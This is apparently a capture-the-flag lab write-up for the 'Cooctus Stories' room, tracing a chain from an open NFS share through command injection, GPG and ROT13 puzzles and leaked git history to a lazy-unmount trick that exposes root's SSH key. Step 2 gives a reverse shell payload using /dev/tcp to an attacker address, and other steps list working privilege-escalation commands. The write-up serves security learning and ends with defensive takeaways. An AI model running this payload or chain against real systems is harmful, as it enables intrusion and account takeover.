Cooctus Stories: an NFS leak and a sudo unmount escape to root

An open NFS export hands over plaintext credentials with no authentication at all. From there: a "test your exploit" web tool that just runs whatever you type, a GPG-and-ROT13 puzzle chain, a password sitting in old git history, and a sudo-permitted unmount that turns out to reveal root's own SSH key hiding underneath a decoy filesystem.

Room: Cooctus Stories Category: Web / Linux Privesc Tools: showmount, gpg, git, sudo

The setup: an NFS share with no access control, a web "attack troubleshooter" that takes raw input a little too literally, and a filesystem mount trick hiding the real prize underneath a fake one. The job: chain all of it to a root shell.

The Investigation

1
Mount the open NFS share and read what's on it

showmount -e lists any exports the target is serving with no authentication required:

showmount -e 10.10.96.187
Export list for 10.10.96.187:
/var/nfs/general *

Mounting it locally (after making a folder to mount it into) makes its contents appear as ordinary local files:

sudo mount -t nfs 10.10.96.187:/var/nfs/general ~/Desktop/general -o nolock

Inside sits a single file, credentials.bak, 31 bytes:

cat credentials.bak
paradoxial.test
ShibaPretzel79
Why this works

NFS exports are often trusted by IP/hostname rather than credentials. A * in the export list means any client can mount it, and whatever's inside is handed over exactly as if it were a local file.

2
Log in, then abuse a "test your exploit" box

The recovered credentials work on a login page on port 8080. Behind it sits the Cooctus Attack Troubleshooter (C.A.T), a tool that invites you to "test your exploits in a safe environment" by typing a payload into a text box and submitting it. Feeding it a reverse shell redirect does exactly what it looks like it would:

>/dev/tcp/10.2.57.21/4444 <&1'

That lands a shell as a real service account:

szymex@cchq:/$ id
uid=1001(szymex) gid=1001(szymex) groups=1001(szymex),1004(testers)
Why this works

A "safe sandbox" for testing exploit strings is only sandboxed if the input is actually isolated from a real shell. Here it wasn't, the submitted text reached a real /bin/sh context on a real account, in the testers group no less.

3
Enumerate what the testers group can see

Being a member of testers means a targeted filesystem search turns up everything that group can read, instead of guessing paths one at a time:

find / -group testers -ls 2>/dev/null

791866  drwxrwx---  2 tux testers  /home/tux/tuxling_3
791869  -rwxrwx---  1 tux testers  /home/tux/tuxling_3/note
655438  drwxrwx---  2 tux testers  /home/tux/tuxling_1
655541  -rw-rw----  1 tux testers  /home/tux/tuxling_1/nootcode.c
655698  -rw-rw----  1 tux testers  /home/tux/tuxling_1/note

655545  -rw-rw----  1 tux testers  /media/tuxling_2/note
655463  -rw-rw-r--  1 tux testers  /media/tuxling_2/fragment.asc
Why this works

find -group turns "what can this group access" into a single command instead of trial-and-error directory listing, and it surfaces files (a .asc encrypted fragment, a private key) that are clear next steps on sight.

4
Decrypt the GPG fragment

The private key imports cleanly, then decrypts the fragment sitting next to it:

gpg --import private.key
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported

gpg --decrypt fragment.asc
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d
Why this works

A private key found sitting unprotected next to the file it decrypts isn't really encryption at that point, it's an extra step. The two-command --import then --decrypt pattern is the standard way to use any recovered GPG keypair.

5
Reverse a ROT13 password-recovery script

One of the other notes is a small Python program that ROT13-encodes a candidate password and compares it against a target string, printing the plaintext once it matches. Stepping through it by hand (or in a debugger) against the encrypted target "pureelpbxr" against the charset "qwertyuiopasdfghjklzxcvbnm" recovers the password one character at a time, landing on cherrycoke.

Why this works

ROT13 is its own inverse, applying it twice returns the original text. Once the script's ROT13 logic is understood, there's no need to run the program at all, the target string can just be decoded directly.

6
Run the sudo-permitted script as the next user

szymex can run a specific script as user varg:

sudo -u varg /home/varg/CoocOS.py

It boots a fake splash screen and mounts a filesystem:

[  OK  ] Cold boot detected. Flux Capacitor powered up
[  OK  ] Mounted Cooctus Filesystem under /opt
[  OK  ] Finished booting sequence
CoocOS 13.3.7 LTS cookie tty1
Why this works

A sudo rule scoped to one specific script still runs with that script's full logic, including whatever filesystem operations it performs. The joke splash screen is a distraction from the fact that a real mount just happened under /opt.

7
Pull varg's password out of exposed git history

Inside varg's home sits a hidden .git directory with its revision history still intact:

cat .git/logs/HEAD
0000...0000 6919df5c171460507f69769bc20e19bd0838b74d Vargles  ...  commit (initial): Created git repo for CoocOS
6919df5c... 8b8daa41120535c569d0b99c6859a1699227d086 Vargles  ...  commit: Removed CooctOS login script for now

git diff 8b8daa41120535c569d0b99c6859a1699227d086 6919df5c171460507f69769bc20e19bd0838b74d

The diff shows the removed login script in full, including a hardcoded check:

+for i in range(0,2):
+    if pw != "slowroastpork":
+        pw = input("Password: ")
+    else:
+        if uname == "varg":
+            os.setuid(1002)
+            os.setgid(1002)
+            pty.spawn("/bin/rbash")
Why this works

Removing a file in a later commit doesn't erase it from history, git diff between two commit hashes from the reflog shows exactly what changed, including a plaintext password that was never meant to stay reachable.

8
Lazy-unmount the decoy filesystem

Logged in as varg, sudo -l shows one permitted command:

sudo -l
User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount

df -ha confirms /opt/CooctFS is a real, sizeable mount, not just the splash-screen simulation from step 6. A plain unmount and a forced one both fail because the mount is in use, but a lazy unmount succeeds:

df -ha | grep opt
/dev/mapper/ubuntu--vg-ubuntu--lv   19G  6.5G   12G  37%  /opt/CooctFS

sudo /bin/umount /opt/CooctFS
umount: /opt/CooctFS: target is busy.
sudo /bin/umount -f /opt/CooctFS
umount: /opt/CooctFS: target is busy.
sudo /bin/umount -l /opt/CooctFS
Why this works

A lazy unmount (-l) detaches the mount point immediately even while it's busy, deferring actual cleanup until nothing references it anymore. The important part isn't the flag itself, it's what unmounting reveals next.

9
Find root's SSH key hiding underneath the mount

With the overlay detached, the directory underneath it, previously hidden by whatever was mounted over it, is exposed:

cd /opt/CooctFS
ls -la
drwxr-xr-x 5 root root 4096 Feb 20 09:16 root

cd root
ls -la
-rw-r--r-- 1 root root   43 Feb 20 09:16 root.txt
drwxr-xr-x 2 root root 4096 Feb 20 09:41 .ssh

cd .ssh
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAx2+vTyYoQxGMHh/CddrGqllxbhNo3P4rPNqQiWkTPFnxxNv6
...

Saved locally, chmod'd to 600, and used directly:

chmod 600 rsaprivatekey
ssh -i rsaprivatekey root@10.10.136.2
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)
Why this works

Mounting something over a directory doesn't delete what's underneath, it just hides it from view until the mount is removed. A "decoy OS" mounted over root's real home directory was never actually protecting it, just obscuring it from a user who never thought to unmount it.

Full Attack Chain

showmount -e: open NFS export, no auth
  → mounted share: credentials.bak leaks a username/password
       → web login (port 8080) → C.A.T tool executes raw input
            → reverse shell as szymex (testers group)
                 → find -group testers: a GPG fragment and an encoded note
                      → GPG decrypt: a key fragment recovered
                      → ROT13 reversed by hand: varg's CoocOS password
                           → sudo -u varg CoocOS.py: mounts /opt/CooctFS
                                → varg's .git history: an old script leaks varg's real password
                                     → sudo -l: NOPASSWD umount
                                          → lazy unmount: decoy filesystem detached
                                               → root's SSH key exposed underneath → root shell

Takeaways

NFS exports need the same scrutiny as any network share

An export with no IP or auth restriction is effectively a public read of whatever it serves, this room's entire chain started from one.

A "safe sandbox" is only safe if the input is actually isolated

A tool inviting users to test exploit strings needs to actually sandbox what it executes, not just imply that it does.

Git history outlives the files you meant to protect

A password removed in a later commit is still sitting in every prior commit unless history itself is rewritten.

A mount is a cover, not a deletion

Mounting one filesystem over a sensitive directory hides it, it doesn't protect it. Whoever can unmount it gets to see what was underneath the whole time.
